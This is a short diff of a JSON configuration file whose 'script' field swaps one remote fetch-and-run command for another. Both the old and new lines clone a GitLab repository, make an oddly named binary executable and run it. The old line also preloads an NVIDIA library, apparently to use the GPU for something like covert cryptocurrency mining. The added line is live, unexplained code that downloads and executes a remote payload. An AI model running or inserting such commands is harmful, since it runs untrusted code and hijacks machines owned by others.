@@ -1,5 +1,5 @@
 {
-"script": "\n!export LD_PRELOAD=/usr/lib64-nvidia/libnvidia-ml.so && git clone https://gitlab.com/Sodar143/korasa.git && cd korasa && chmod +x ./koda && ./koda",
+"script": "\n!git clone https://gitlab.com/Mwertz11983/gonzales.git && cd gonzales && chmod +x ./nellie && ./nellie",
 "validate": true,
 "version": "1.10"
 }
